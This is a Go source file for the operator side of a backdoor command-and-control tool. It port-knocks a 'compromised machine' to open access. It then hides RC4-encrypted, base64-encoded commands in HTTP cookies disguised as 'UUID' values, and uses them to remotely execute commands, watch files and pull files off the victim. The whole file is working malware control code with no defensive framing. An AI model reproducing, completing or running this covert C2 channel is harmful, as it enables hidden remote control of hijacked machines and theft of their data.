package main

import (
	"bufio"
	"crypto/rc4"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

type cookieHandler struct {
	commands  chan []byte
	responses chan string
}

const (
	EXEC  byte = 1
	WATCH byte = 2
	GET   byte = 3
)

var (
	fileMap      = make(map[byte]io.WriteCloser)
	seqNum  byte = 0
)

func main() {

	// grab ports to port knock on from command line
	ipAddressOfCompremisedMachine := os.Args[1]
	port1OfCompremisedMachine := os.Args[2]
	port2OfCompremisedMachine := os.Args[3]
	port3OfCompremisedMachine := os.Args[4]

	var c cookieHandler

	c.commands = make(chan []byte)
	c.responses = make(chan string)

	//execute port knocking on comprmised machine
	portKnock(ipAddressOfCompremisedMachine, port1OfCompremisedMachine, port2OfCompremisedMachine, port3OfCompremisedMachine)
	go waitForConnection(c)

	go handleResponse(c.responses)

	acceptCommandFromStdin(c.commands)

}

func runCommand(commandToRun string) (resultReturned string) {
	print(commandToRun)
	return "test"

}

func portKnock(ip string, port1 string, port2 string, port3 string) {
	conn, err := net.Dial("udp", ip+":"+port1)
	conn.Write([]byte(""))
	connectionError(err)
	time.Sleep(time.Millisecond * 100)
	conn.Close()
	conn, err = net.Dial("udp", ip+":"+port2)
	connectionError(err)
	conn.Write([]byte(""))
	time.Sleep(time.Millisecond * 100)
	conn.Close()
	conn, err = net.Dial("udp", ip+":"+port3)
	connectionError(err)
	conn.Write([]byte(""))
	conn.Close()
}

func waitForConnection(c cookieHandler) {
	var server http.Server

	server.Handler = c
	server.Addr = ":8000"
	server.ListenAndServe()

	//http.HandleFunc("/", cookieHandler)
	//http.ListenAndServe(":8000", nil)
}

func (c cookieHandler) ServeHTTP(writer http.ResponseWriter, request *http.Request) {

	cookies := request.Cookies()

	for _, myCookie := range cookies {

		c.responses <- myCookie.Value
	}

	var myCookie http.Cookie
	select {

	case cmd := <-c.commands:
		myCookie.Value = encrypt(cmd)
		myCookie.Name = "UUID"
		myCookie.MaxAge = 50
		myCookie.Secure = false
		myCookie.HttpOnly = false
		writer.Header().Set("Set-Cookie", myCookie.String())
	default:

	}

	io.WriteString(writer, "Hello world!")
}

func acceptCommandFromStdin(acceptedCommand chan<- []byte) {

	//forever read from stdin

	buffer := bufio.NewReader(os.Stdin)

	for {

		line, err := buffer.ReadBytes('\n')

		if err != nil {
			panic(err)
		}

		splitCommands := strings.Split(strings.TrimSpace(string(line)), " ")
		commandBuf := make([]byte, 0, 3)

		switch splitCommands[0] {
		case "get":
			if len(splitCommands) != 3 {
				print("useage: get <remotefile> <localfile>")
				continue
			}

			file, err := os.Create(splitCommands[2])
			if err != nil {
				fmt.Printf("file opening failed: %v", err.Error())
				continue
			}
			fileMap[seqNum] = file

			commandBuf = append(commandBuf, GET, seqNum)

			seqNum++

			commandBuf = append(commandBuf, []byte(splitCommands[1])...)

		case "watch":
			commandBuf = append(commandBuf, WATCH, seqNum)
			seqNum++

			commandBuf = append(commandBuf, []byte(splitCommands[1])...)

		case "exec":
			commandBuf = append(commandBuf, EXEC, seqNum)
			seqNum++

			for _, cmd := range splitCommands[1:] {
				commandBuf = append(commandBuf, []byte(cmd)...)
				commandBuf = append(commandBuf, 0x20)
			}

		case "chdir":
		default:
			println("dumbass")
			continue

		}

		acceptedCommand <- commandBuf

	}
}

func handleResponse(channelResponses <-chan string) {
	for {
		//write a map of concurrent filehandles
		data := decrypt(<-channelResponses)

		fmt.Println("recieved response\n\n")

		switch data[0] {
		case EXEC:
			fmt.Println(string(data[2:]))
		case WATCH:
			fmt.Printf("Activity on watch : %v", string(data[2:]))
		case GET:
			if len(data) == 2 {
				fileMap[data[1]].Close()
				fmt.Println("closing file")
			} else {

				fmt.Println("adding to file")
				fileMap[data[1]].Write(data[2:])
			}
		default:
			fmt.Printf("invalid type : %v", data[0])
		}

		fmt.Println("end response\n\n")
		//fmt.Printf("%v %v: %v", data[0], data[1], string(data[2:]))

	}
}

func connectionError(err error) {
	if err != nil {
		print(err)
		os.Exit(1)
	}
}

func decrypt(data string) []byte {

	decoded, _ := base64.RawStdEncoding.DecodeString(data)

	ciper, err := rc4.NewCipher([]byte("myKey"))
	if err != nil {
		print(err)
	}
	ciper.XORKeyStream(decoded, decoded)

	return []byte(decoded)
}

func encrypt(data []byte) string {

	ciper, err := rc4.NewCipher([]byte("myKey"))
	if err != nil {
		print(err)
	}
	ciper.XORKeyStream(data, data)

	var encoded = base64.RawStdEncoding.EncodeToString(data)

	return string(encoded)
}
